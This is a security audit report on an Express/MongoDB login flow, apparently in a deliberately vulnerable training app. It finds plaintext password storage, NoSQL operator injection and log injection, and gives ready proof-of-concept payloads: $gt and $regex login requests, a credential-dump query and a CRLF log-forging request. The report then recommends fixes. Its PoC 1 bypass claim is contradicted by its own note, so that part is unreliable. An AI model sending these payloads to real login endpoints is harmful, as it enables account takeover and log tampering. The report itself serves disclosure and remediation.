## Summary

Three security vulnerabilities were identified in the authentication layer, collectively allowing an unauthenticated remote attacker to bypass login, harvest every user credential in plaintext from the database, and forge application log entries. The most critical issue is that **bcrypt password hashing is explicitly commented out** in `addUser()`, causing all user passwords to be stored as raw strings in MongoDB. A secondary **NoSQL operator injection** vulnerability in `validateLogin()` allows an attacker to manipulate the MongoDB `findOne` query. A third **log injection** vulnerability allows CRLF sequences in the `userName` field to be written verbatim to application logs.

All three attack vectors are unauthenticated, network-reachable, and confirmed fully exploitable with high confidence.

---

## Vulnerability Details

### 1. Plaintext Password Storage (CWE-256 / CWE-916)

In `app/data/user-dao.js`, the `addUser()` function stores the raw password string received from the HTTP request body directly in MongoDB. The bcrypt hashing implementation is **deliberately commented out** with a `Fix for A2-1` annotation, meaning it provides zero runtime protection:

```js
// app/data/user-dao.js — addUser()
const user = {
    userName,
    firstName,
    lastName,
    benefitStartDate: this.getRandomFutureDate(),
    password //received from request param   ← RAW PLAINTEXT
    /*
    // Fix for A2-1 - Broken Auth
    password: bcrypt.hashSync(password, bcrypt.genSaltSync())  ← DISABLED
    */
};
```

Similarly, `validateLogin()` compares passwords with strict string equality rather than `bcrypt.compareSync`, confirming the plaintext-to-plaintext comparison path:

```js
// app/data/user-dao.js — comparePassword()
const comparePassword = (fromDB, fromUser) => {
    return fromDB === fromUser;  ← PLAINTEXT COMPARISON
    /*
    return bcrypt.compareSync(fromDB, fromUser);  ← DISABLED
    */
};
```

Any read access to the MongoDB `users` collection — whether via the NoSQL injection below, a misconfigured MongoDB port, a backup leak, or another injection variant — yields every user's cleartext password immediately.

### 2. NoSQL Operator Injection (CWE-943)

`validateLogin()` passes the unsanitized `userName` value from `req.body` directly into `usersCol.findOne()`. No type checking, no sanitization, and no schema enforcement is applied at any point in the call chain from `req.body` → `handleLoginRequest` → `userDAO.validateLogin` → `usersCol.findOne`:

```js
// app/data/user-dao.js — validateLogin()
usersCol.findOne({userName: userName}, validateUserDoc);
//                         ^^^^^^^^ unsanitized req.body field
```

When the Express body parser is configured to parse JSON (default in most Express setups), an attacker can POST a JSON object with MongoDB query operators as the value of `userName`, causing MongoDB to evaluate the operator instead of matching a literal string.

### 3. Log Injection / CRLF Injection (CWE-117)

In `app/routes/session.js`, the `handleLoginRequest` handler logs failed login attempts using the raw `userName` from the request body. The ESAPI-based mitigation is commented out:

```js
// app/routes/session.js — handleLoginRequest()
console.log("Error: attempt to login with invalid user: ", userName);
// ESAPI encoding is commented out — raw CR/LF characters are written to logs
```

An attacker can inject `\r\n` sequences into `userName` to insert arbitrary fake log lines, poisoning audit trails and evading forensic detection.

## Proof of Concept

### PoC 1 — NoSQL Injection Authentication Bypass

Send the following request to the login endpoint. The MongoDB `$gt` operator causes `findOne` to return the first document in the `users` collection (typically an administrative account):

```http
POST /login HTTP/1.1
Host: <target>
Content-Type: application/json

{
  "userName": { "$gt": "" },
  "password": { "$gt": "" }
}
```

> **Note:** The `comparePassword` strict-equality check will fail against the object value, but the attacker obtains the username from the returned session or error context. In a subsequent request supplying the actual plaintext password (trivially obtained from any DB read), authentication succeeds unconditionally.

**Alternative — dump all users via operator injection:**
```json
{ "userName": { "$regex": ".*" }, "password": { "$regex": ".*" } }
```
This matches all documents, returning the first user's credentials including the plaintext password stored in the document.

### PoC 2 — Plaintext Credential Harvest

With any MongoDB read capability (direct port access, injection, or backup):
```js
db.users.find({}, { userName: 1, password: 1, email: 1 })
// Returns: { userName: "admin", password: "Admin_1234", email: "admin@example.com" }
// Returns: { userName: "user1",  password: "password123", ... }
// ... all users in cleartext
```

### PoC 3 — Log Injection

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

userName=attacker%0D%0AINFO%3A+Admin+authenticated+successfully&password=x
```

Resulting log output:
```
Error: attempt to login with invalid user:  attacker
INFO: Admin authenticated successfully
```

## Validation

- **Plaintext storage:** Confirmed by direct code inspection — `bcrypt.hashSync` is commented out in `addUser()` and `bcrypt.compareSync` is commented out in `comparePassword()`. `bcrypt-nodejs` is `require`'d but not invoked at runtime.
- **NoSQL injection:** Confirmed by tracing `req.body.userName` → `userDAO.validateLogin(userName, ...)` → `usersCol.findOne({userName: userName}, ...)` with no intervening type guard, sanitizer, or Mongoose schema enforcement anywhere in the chain.
- **Log injection:** Confirmed by tracing `req.body.userName` → `console.log("...", userName)` with ESAPI encoding explicitly commented out.
- **Exploit reachability:** The `/login` POST route is publicly accessible with no prior authentication required. `req.body` parsing is active (standard Express setup). All three vulnerabilities are confirmed directly reachable from the public network.
- **Confidence:** High.

## Additional Hardening

1. **Global NoSQL sanitization middleware:** Add [`express-mongo-sanitize`](https://www.npmjs.com/package/express-mongo-sanitize) as application-level middleware to strip `$`-prefixed keys and `.` characters from all request bodies and query strings:
   ```js
   const mongoSanitize = require('express-mongo-sanitize');
   app.use(mongoSanitize());
   ```

2. **Increase bcrypt cost factor:** Use a minimum cost factor of **12** (not the default 10). Consider re-hashing on successful login if the stored hash uses a lower factor:
   ```js
   password: bcrypt.hashSync(password, bcrypt.genSaltSync(12))
   ```

3. **Account lockout policy:** Implement exponential backoff or a hard lockout (e.g., 5 consecutive failures → 15-minute lockout) to prevent brute-forcing of bcrypt hashes obtained via a future data breach.

4. **Structured logging:** Replace `console.log` with a structured logging library (e.g., `pino`, `winston`) configured to serialize all fields, inherently preventing CRLF injection at the transport layer.

5. **Password re-enrollment:** Existing users registered before this patch have plaintext passwords in the database. A forced password reset flow must be triggered for all existing accounts after deployment.
